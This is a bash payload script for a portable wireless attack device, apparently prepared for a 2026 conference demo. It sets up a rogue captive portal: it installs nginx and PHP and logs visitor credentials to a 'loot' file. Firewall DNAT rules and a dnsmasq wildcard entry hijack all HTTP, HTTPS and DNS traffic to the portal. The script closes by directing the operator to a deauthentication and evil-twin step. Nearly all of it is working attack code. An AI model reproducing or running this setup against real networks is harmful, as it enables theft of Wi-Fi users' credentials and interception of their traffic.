#!/bin/bash
# Title: AV Demo — Setup Portal
# Description: Pre-talk setup: installs nginx + PHP, deploys AV-themed captive portal, configures firewall and DNS hijack
# Author: BICSI-CALA 2026 Demo
# Version: 1.0
# Category: user/interception
#
# Deploy to: /mmc/root/payloads/user/interception/av_demo_setup/
# Requires: internet connection active on Pager
# Based on: goodportal_configure/payload.sh by spencershepard (GRIMM)

PORTAL_IP="172.16.52.1"
PORTAL_ROOT="/www/av_demo"
LOOT_DIR="/root/loot/av_demo"
# shellcheck disable=SC2034  # used by whitelist_monitor.sh
WHITELIST_FILE="/tmp/av_demo_whitelist.txt"
PAYLOAD_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

LOG green "=== AV Demo Portal Setup ==="
LOG "Portal IP: $PORTAL_IP"
LOG "Portal root: $PORTAL_ROOT"
LOG ""

# ─── 1. Update package lists ──────────────────────────────────────────────────
NEED_NGINX=false
NEED_PHP=false
command -v nginx >/dev/null 2>&1 || NEED_NGINX=true
opkg list-installed 2>/dev/null | grep -q php8-fpm || NEED_PHP=true

if [ "$NEED_NGINX" = true ] || [ "$NEED_PHP" = true ]; then
    LOG yellow "[INFO] Updating package lists..."
    opkg update 2>/dev/null || { ERROR_DIALOG "opkg update failed. Check internet connection."; exit 1; }
fi

# ─── 2. Install nginx ─────────────────────────────────────────────────────────
if [ "$NEED_NGINX" = true ]; then
    LOG yellow "[INFO] nginx not found — installing..."
    opkg install nginx
    if ! command -v nginx >/dev/null 2>&1; then
        ERROR_DIALOG "nginx installation failed. Check internet connection."
        exit 1
    fi
    LOG green "nginx installed"
else
    LOG "nginx already installed"
fi

# ─── 3. Install PHP ────────────────────────────────────────────────────────────
if [ "$NEED_PHP" = true ]; then
    LOG yellow "[INFO] php8-fpm not found — installing..."
    opkg install php8 php8-fpm php8-cgi
    if ! opkg list-installed | grep -q php8-fpm; then
        ERROR_DIALOG "PHP installation failed. Check internet connection."
        exit 1
    fi
    LOG green "PHP installed"
else
    LOG "PHP already installed"
fi

# ─── 4. Configure PHP-FPM ─────────────────────────────────────────────────────
LOG "Configuring PHP for captive portal..."

# Disable doc_root restriction (causes "No input file specified")
if grep -q '^doc_root = "/www"' /etc/php.ini 2>/dev/null; then
    sed -i 's/^doc_root = "\/www"/doc_root =/' /etc/php.ini
    LOG "  Disabled doc_root restriction in php.ini"
fi

# Disable cgi.force_redirect
mkdir -p /etc/php8
cat > /etc/php8/99-custom.ini << 'PHPINI'
cgi.force_redirect = 0
cgi.fix_pathinfo = 1
PHPINI
LOG "  Created /etc/php8/99-custom.ini"

LOG "  Restarting PHP-FPM..."
/etc/init.d/php8-fpm restart 2>/dev/null || /etc/init.d/php-fpm restart 2>/dev/null || true
sleep 1

# ─── 5. Deploy portal files ────────────────────────────────────────────────────
LOG "Deploying portal..."
mkdir -p "$PORTAL_ROOT"
mkdir -p "$LOOT_DIR"
chmod 777 "$LOOT_DIR"

# Look in payload dir first (on-device), then repo-relative path (development)
if [ -f "$PAYLOAD_DIR/index.php" ]; then
    PORTAL_SRC="$PAYLOAD_DIR/index.php"
elif [ -f "$PAYLOAD_DIR/../../portal/index.php" ]; then
    PORTAL_SRC="$PAYLOAD_DIR/../../portal/index.php"
else
    ERROR_DIALOG "index.php not found — copy portal/index.php to $PAYLOAD_DIR/"
    exit 1
fi
cp "$PORTAL_SRC" "$PORTAL_ROOT/index.php"
chmod 644 "$PORTAL_ROOT/index.php"
LOG green "  Deployed index.php to $PORTAL_ROOT/"

# Initialize credentials log
touch "$LOOT_DIR/credentials.log"
chmod 666 "$LOOT_DIR/credentials.log"
LOG "  Created credentials.log"

# ─── 6. Detect PHP-FPM socket ─────────────────────────────────────────────────
if [ -S /var/run/php8-fpm.sock ]; then
    FPM_SOCK="/var/run/php8-fpm.sock"
elif [ -S /var/run/php-fpm/php-fpm.sock ]; then
    FPM_SOCK="/var/run/php-fpm/php-fpm.sock"
elif [ -S /var/run/php-fpm.sock ]; then
    FPM_SOCK="/var/run/php-fpm.sock"
else
    FPM_SOCK="/var/run/php8-fpm.sock"
    LOG yellow "  Warning: PHP-FPM socket not found yet, using default: $FPM_SOCK"
fi
LOG "  PHP-FPM socket: $FPM_SOCK"

# ─── 7. Write nginx.conf ──────────────────────────────────────────────────────
LOG "Configuring nginx..."

# Disable UCI nginx to prevent conflicts
uci set nginx.global.uci_enable=false 2>/dev/null || true
uci commit nginx 2>/dev/null || true

# Backup original config if not already backed up
if [ ! -f /etc/nginx/nginx.conf.av_demo.bak ]; then
    cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.av_demo.bak 2>/dev/null || true
    LOG "  Backed up nginx.conf"
fi

cat > /etc/nginx/nginx.conf << NGINXEOF
user root root;
worker_processes 1;

events {
    worker_connections 1024;
}

http {
    include mime.types;
    default_type text/html;
    sendfile on;
    keepalive_timeout 65;

    server {
        listen 80 default_server;
        server_name _;
        root $PORTAL_ROOT;
        index index.php index.html;

        # Captive portal detection endpoints
        location = /generate_204 { return 302 http://\$host/; }
        location = /gen_204 { return 302 http://\$host/; }
        location = /connecttest.txt { return 302 http://\$host/; }
        location = /success.txt { return 302 http://\$host/; }
        location = /hotspot-detect.html { return 302 http://\$host/; }
        location = /canonical.html { return 302 http://\$host/; }
        location = /library/test/success.html { return 302 http://\$host/; }

        location ~ \.php\$ {
            fastcgi_pass unix:$FPM_SOCK;
            fastcgi_index index.php;
            include fastcgi_params;
            fastcgi_param SCRIPT_FILENAME \$document_root\$fastcgi_script_name;
        }

        location / {
            try_files \$uri \$uri/ =404;
        }

        error_page 404 = @fallback;

        location @fallback {
            rewrite ^ /index.php last;
        }
    }
}
NGINXEOF

LOG "  nginx.conf written"

# ─── 8. Start nginx ───────────────────────────────────────────────────────────
LOG "Starting PHP-FPM..."
/etc/init.d/php8-fpm start 2>/dev/null || /etc/init.d/php-fpm start 2>/dev/null || true
sleep 1

LOG "Starting nginx..."
/etc/init.d/nginx stop 2>/dev/null || true
killall nginx 2>/dev/null || true
sleep 1

if ! nginx -t 2>&1 | grep -q "test is successful"; then
    LOG red "[ERROR] nginx configuration test failed!"
    nginx -t 2>&1 | while read -r line; do LOG "  $line"; done
    ERROR_DIALOG "nginx config invalid! Check logs."
    exit 1
fi

/etc/init.d/nginx start
sleep 2
LOG green "nginx started"

# ─── 9. Firewall rules (AVDemo prefix) ────────────────────────────────────────
LOG "Configuring firewall NAT rules..."

# HTTP redirect
if ! uci show firewall | grep -q "name='AVDemo HTTP lan'"; then
    uci add firewall redirect
    uci set firewall.@redirect[-1].name='AVDemo HTTP lan'
    uci set firewall.@redirect[-1].src='lan'
    uci set firewall.@redirect[-1].src_dip="!$PORTAL_IP"
    uci set firewall.@redirect[-1].proto='tcp'
    uci set firewall.@redirect[-1].src_dport='80'
    uci set firewall.@redirect[-1].dest_ip="$PORTAL_IP"
    uci set firewall.@redirect[-1].dest_port='80'
    uci set firewall.@redirect[-1].target='DNAT'
    uci set firewall.@redirect[-1].enabled='1'
    LOG "  Added HTTP redirect rule"
else
    LOG "  HTTP redirect rule already exists"
fi

# HTTPS → HTTP redirect
if ! uci show firewall | grep -q "name='AVDemo HTTPS lan'"; then
    uci add firewall redirect
    uci set firewall.@redirect[-1].name='AVDemo HTTPS lan'
    uci set firewall.@redirect[-1].src='lan'
    uci set firewall.@redirect[-1].src_dip="!$PORTAL_IP"
    uci set firewall.@redirect[-1].proto='tcp'
    uci set firewall.@redirect[-1].src_dport='443'
    uci set firewall.@redirect[-1].dest_ip="$PORTAL_IP"
    uci set firewall.@redirect[-1].dest_port='80'
    uci set firewall.@redirect[-1].target='DNAT'
    uci set firewall.@redirect[-1].enabled='1'
    LOG "  Added HTTPS->HTTP redirect rule"
else
    LOG "  HTTPS redirect rule already exists"
fi

# DNS TCP redirect
if ! uci show firewall | grep -q "name='AVDemo DNS TCP lan'"; then
    uci add firewall redirect
    uci set firewall.@redirect[-1].name='AVDemo DNS TCP lan'
    uci set firewall.@redirect[-1].src='lan'
    uci set firewall.@redirect[-1].proto='tcp'
    uci set firewall.@redirect[-1].src_dport='53'
    uci set firewall.@redirect[-1].dest_ip="$PORTAL_IP"
    uci set firewall.@redirect[-1].dest_port='1053'
    uci set firewall.@redirect[-1].target='DNAT'
    uci set firewall.@redirect[-1].enabled='1'
    LOG "  Added DNS TCP redirect rule"
else
    LOG "  DNS TCP redirect rule already exists"
fi

# DNS UDP redirect
if ! uci show firewall | grep -q "name='AVDemo DNS UDP lan'"; then
    uci add firewall redirect
    uci set firewall.@redirect[-1].name='AVDemo DNS UDP lan'
    uci set firewall.@redirect[-1].src='lan'
    uci set firewall.@redirect[-1].proto='udp'
    uci set firewall.@redirect[-1].src_dport='53'
    uci set firewall.@redirect[-1].dest_ip="$PORTAL_IP"
    uci set firewall.@redirect[-1].dest_port='1053'
    uci set firewall.@redirect[-1].target='DNAT'
    uci set firewall.@redirect[-1].enabled='1'
    LOG "  Added DNS UDP redirect rule"
else
    LOG "  DNS UDP redirect rule already exists"
fi

uci commit firewall
/etc/init.d/firewall restart
LOG green "Firewall rules applied"

# ─── 10. DNS hijack ────────────────────────────────────────────────────────────
LOG "Starting DNS hijack..."

# Kill any existing av_demo dnsmasq process
if [ -f /tmp/av_demo-dns.pid ]; then
    OLD_PID=$(cat /tmp/av_demo-dns.pid)
    if kill -0 $OLD_PID 2>/dev/null; then
        kill $OLD_PID 2>/dev/null
        LOG "  Stopped existing DNS hijack (PID: $OLD_PID)"
    fi
fi

# Also kill any dnsmasq on port 1053 (fallback)
kill "$(netstat -plant 2>/dev/null | grep ':1053' | awk '{print $NF}' | sed 's/\/dnsmasq//g')" 2>/dev/null || true

dnsmasq --no-hosts --no-resolv --address=/#/${PORTAL_IP} --dns-forward-max=1 --cache-size=0 -p 1053 --listen-address=0.0.0.0,::1 --bind-interfaces &
DNS_PID=$!
echo "$DNS_PID" > /tmp/av_demo-dns.pid
LOG green "DNS hijack active (PID: $DNS_PID) — all domains → $PORTAL_IP"

# ─── 11. IP forwarding + disable IPv6 ────────────────────────────────────────
LOG "Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward
LOG green "IP forwarding enabled"

LOG "Disabling IPv6 on br-lan (forces IPv4 captive portal path)..."
sysctl -w net.ipv6.conf.br-lan.disable_ipv6=1 2>/dev/null || LOG "  IPv6 already disabled or not available"
LOG green "IPv6 disabled on br-lan"

# ─── 12. Launch whitelist monitor ─────────────────────────────────────────────
LOG "Starting whitelist monitor..."

if [ -f "$PAYLOAD_DIR/whitelist_monitor.sh" ]; then
    cp "$PAYLOAD_DIR/whitelist_monitor.sh" /tmp/av_demo_whitelist_monitor.sh
    chmod +x /tmp/av_demo_whitelist_monitor.sh
else
    ERROR_DIALOG "whitelist_monitor.sh not found in $PAYLOAD_DIR"
    exit 1
fi

# Kill existing monitor if running
if [ -f /tmp/av_demo-whitelist.pid ]; then
    OLD_PID=$(cat /tmp/av_demo-whitelist.pid)
    if kill -0 $OLD_PID 2>/dev/null; then
        kill $OLD_PID 2>/dev/null
        LOG "  Stopped existing whitelist monitor (PID: $OLD_PID)"
    fi
fi

/tmp/av_demo_whitelist_monitor.sh &
MONITOR_PID=$!
echo "$MONITOR_PID" > /tmp/av_demo-whitelist.pid
LOG green "Whitelist monitor active (PID: $MONITOR_PID)"

# ─── 13. Verification ─────────────────────────────────────────────────────────
LOG "Verifying portal..."

HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:80/)
if [ "$HTTP_CODE" = "200" ]; then
    LOG green "Portal responding on port 80 (HTTP $HTTP_CODE)"
else
    LOG yellow "[WARNING] Portal returned HTTP $HTTP_CODE (expected 200)"
fi

# Verify DNS hijack
if netstat -plant 2>/dev/null | grep -q ':1053'; then
    LOG green "DNS hijack listening on port 1053"
else
    LOG red "[ERROR] DNS hijack not listening on port 1053"
fi

# Verify firewall rules
RULE_COUNT=$(uci show firewall | grep -c "AVDemo.*lan")
if [ "$RULE_COUNT" -eq 4 ]; then
    LOG green "All 4 firewall rules configured"
else
    LOG red "[ERROR] Expected 4 firewall rules, found $RULE_COUNT"
fi

# Force captive portal re-detection
sleep 2
/etc/init.d/firewall restart

if [ -f /tmp/av_demo-dns.pid ]; then
    kill "$(cat /tmp/av_demo-dns.pid)" 2>/dev/null
fi

dnsmasq --no-hosts --no-resolv \
    --address=/#/${PORTAL_IP} \
    --dns-forward-max=1 \
    --cache-size=0 \
    -p 1053 \
    --listen-address=0.0.0.0,::1 \
    --bind-interfaces &
echo $! > /tmp/av_demo-dns.pid

LOG green "Captive portal re-detection triggered"

LOG ""
LOG green "================================="
LOG green "AV Demo Portal Ready!"
LOG green "================================="
LOG ""
LOG "Portal URL:    http://$PORTAL_IP/"
LOG "Credentials:   $LOOT_DIR/credentials.log"
LOG ""
LOG yellow "Next step: disconnect Pager from internet,"
LOG yellow "then run 2_deauth_and_twin from Recon → AV-Control AP"

exit 0
